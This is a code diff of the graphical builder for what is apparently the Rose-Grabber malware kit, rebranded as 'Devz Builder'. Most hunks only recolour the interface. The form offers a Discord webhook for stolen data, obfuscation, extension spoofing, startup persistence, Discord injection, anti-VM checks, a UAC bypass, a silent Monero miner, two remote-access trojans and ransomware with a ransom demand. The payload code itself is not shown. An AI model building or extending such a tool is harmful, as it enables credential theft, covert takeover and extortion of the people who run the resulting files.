@@ -42,7 +42,7 @@ __avatar__ = 'https://cdn.discordapp.com/attachments/1155214110364008548/1155214
 __version__ = '1.9'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://cdn.discordapp.com/attachments/1155214110364008548/1155214244564971583/8eb9b9fc-283e-42f1-9b08-26c7fa00dc09.jpg"
-__devmsg__ = requests.get("https://raw.githubusercontent.com/awijriawfdawd/xxx/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
+__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
     "webhook_url": "",
@@ -152,7 +152,7 @@ async def test_webhook(webhook_url):
             )
             embed.set_author(name="Success", icon_url=__icon__)
             embed.set_footer(text="Devz Builder | By Devzhtz", icon_url=__icon__)
-            await hook.send(embed=embed, username='Devz', avatar_url='24f02e7c83f8bd6c694e8ad4a84b765b5a4295acf7142d3f740eac291caa29fe3b54ff603af227ce1b444fec1307cf370330833fbf2489ad7750d876f4b9a4a870c5a18b7a2a83019c0d8abc6e6971972afe2698c34c55368d51f658fe70e0af228373b4a9043f8684833f4067bcbcde06251ed94721089f17baee31fe9173356943ae9cfbccdfaf')
+            await hook.send(embed=embed, username='Devz', avatar_url='https://cdn.discordapp.com/attachments/1155214110364008548/1155214244564971583/8eb9b9fc-283e-42f1-9b08-26c7fa00dc09.jpg')
         return 0
     except Exception as e:
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
@@ -521,41 +521,41 @@ def _home():
             label='Webhook URL',
             placeholder='Devz on top baby',
             on_change=lambda e: change_data("webhook_url", e.value)
-        ).props('inline color=pink-3').classes('w-full')
+        ).props('inline color=green-3').classes('w-full')
         ui.input(
             label='Build name',
             placeholder='Devz on top baby',
             on_change=lambda e: change_data("build_name", e.value)
-        ).props('inline color=pink-3').classes('w-full')
+        ).props('inline color=green-3').classes('w-full')
         choose_file_icon = ui.select(
             label='File icon',
             options=['Windows Exe', 'Use Custom'],
             on_change=lambda e: change_data("icon_file", e.value)
-        ).props('inline color=pink-3').classes('w-full')
-        ui.button('Set custom file icon', on_click=select_icon).props("icon=code color=purple-11").bind_visibility_from(choose_file_icon, 'value')
+        ).props('inline color=green-3').classes('w-full')
+        ui.button('Set custom file icon', on_click=select_icon).props("icon=code color=green").bind_visibility_from(choose_file_icon, 'value')
         ui.select(
             label='Returned file type',
             options=["Executable (.exe)", "Screensaver (.scr)"],#, "Batch (.bat)", "PowerShell (.ps1)", "Visual Basic Script (.vbs)"],
             on_change=lambda e: change_data('type_file', e.value)
-        ).props("color=pink-3").classes('w-full')
-        ui.checkbox('Obfuscation', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')
+        ).props("color=green-3").classes('w-full')
+        ui.checkbox('Obfuscation', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=green-3')
         with ui.row():
-            _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=pink-3')
+            _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=green-3')
             ui.input(label='Pump Size', placeholder='Size in MB',
-                on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
+                on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=green-3')
         with ui.row():
-            _spoofer = ui.checkbox('Extension Spoofer', on_change=lambda e: change_data('extension_spoofer', e.value)).props('inline color=pink-3')
+            _spoofer = ui.checkbox('Extension Spoofer', on_change=lambda e: change_data('extension_spoofer', e.value)).props('inline color=green-3')
             ui.input(label='Spoofed Extension', placeholder='zip, pdf...',
-                on_change=lambda e: change_data('spoofed_extension', e.value)).bind_visibility_from(_spoofer, 'value').props('inline color=pink-3')
-        ui.checkbox('Return password protected ZIP archive', on_change=lambda e: change_data('return_zip', e.value)).props('inline color=pink-3')
+                on_change=lambda e: change_data('spoofed_extension', e.value)).bind_visibility_from(_spoofer, 'value').props('inline color=green-3')
+        ui.checkbox('Return password protected ZIP archive', on_change=lambda e: change_data('return_zip', e.value)).props('inline color=green-3')
         ui.button(
             'Test Webhook',
             on_click=_test_webhook
-        ).props("icon=code color=purple-11").classes('w-full')
+        ).props("icon= color=green").classes('w-full')
         ui.button(
             'Build',
             on_click=start_computation
-        ).props("icon=build color=pink-3").classes('w-full')
+        ).props("icon=build color=green").classes('w-full')
 
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
         might_take = ui.label("Some steps in the process may take a few minutes, so please be patient :)")
@@ -565,20 +565,20 @@ def _home():
 def _functions():
     with ui.column():
         with ui.expansion('System', icon='work').classes('w-full'):
-            ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=pink')
+            ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=green')
             with ui.row():
                 _inj = ui.checkbox(
                     'Injection',
                     on_change=lambda e: change_data('injection', e.value)
-                ).props('inline color=pink')
+                ).props('inline color=green')
                 ui.checkbox(
                     'Buy Nitro',
                     on_change=lambda e: change_data('nitro_buy', e.value)
-                ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
+                ).bind_visibility_from(_inj, 'value').props('inline color=green')  
                 
-            ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=pink')
-            ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=pink')
-            ui.checkbox('UAC Bypass', on_change=lambda e: change_data('uac_bypass', e.value)).props('inline color=pink')
+            ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=green')
+            ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=green')
+            ui.checkbox('UAC Bypass', on_change=lambda e: change_data('uac_bypass', e.value)).props('inline color=green')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
@@ -601,36 +601,36 @@ def _functions():
         with ui.expansion('Advanced', icon='work').classes('w-full'):
             with ui.column():
                 with ui.row():
-                    _miner = ui.checkbox('Silent Crypto Miner', on_change=lambda e: change_data('silent_crypto_miner', e.value)).props('inline color=yellow-7')
+                    _miner = ui.checkbox('Silent Crypto Miner', on_change=lambda e: change_data('silent_crypto_miner', e.value)).props('inline color=green')
                     ui.input(label='Monero Wallet adress', placeholder='Bitcoin wallet adress',
-                        on_change=lambda e: change_data('wallet_adress', e.value)).bind_visibility_from(_miner, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('wallet_adress', e.value)).bind_visibility_from(_miner, 'value').props('inline color=green')
                 with ui.row():
-                    _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
+                    _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=green')
                     ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
-                        on_change=lambda e: change_data('rose_rat_url', e.value)).bind_visibility_from(_rose_rat, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('rose_rat_url', e.value)).bind_visibility_from(_rose_rat, 'value').props('inline color=green')
                 with ui.row():
-                    _knight_rat = ui.checkbox('Knight-RAT', on_change=lambda e: change_data('knight_rat', e.value)).props('inline color=yellow-7')
+                    _knight_rat = ui.checkbox('Knight-RAT', on_change=lambda e: change_data('knight_rat', e.value)).props('inline color=green')
                     ui.input(label='Knight-RAT Bot Token', placeholder='Knight on top baby',
-                        on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=green')
                     ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
-                        on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=green')
                     ui.input(label='Knight-RAT Listener User ID', placeholder='Knight on top baby',
-                        on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=green')
                     ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
-                        on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=green')
                 
                 with ui.row():
-                    _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=yellow-7')
+                    _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=green')
                     ui.input(label='Monero Wallet adress', placeholder='Rose On Top baby!!!',
-                        on_change=lambda e: change_data('ransomware_monero_wallet_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('ransomware_monero_wallet_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=green')
                     ui.input(label='Webhook URL', placeholder='Rose On Top baby!!!',
-                        on_change=lambda e: change_data('ransomware_discord_webhook_url', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('ransomware_discord_webhook_url', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=green')
                     ui.input(label='Email adress', placeholder='Email adress here',
-                        on_change=lambda e: change_data('ransomware_email_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('ransomware_email_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=green')
                     ui.input(label='Amount of money', placeholder='Amount of money the victim has to pay. (in USD)',
-                        on_change=lambda e: change_data('ransomware_amount_of_money', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
+                        on_change=lambda e: change_data('ransomware_amount_of_money', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=green')
                     
-                ui.checkbox('Melt Stub', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=yellow-7')
+                ui.checkbox('Melt Stub', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=green')
 
 def _github():
     with ui.card():
@@ -679,7 +679,6 @@ def start_nicegui(**kwargs):
         title=__title__,
         **kwargs
     )
-
 if __name__ in {"__main__", "__mp_main__"}:
     auto_update()
     ui.run(
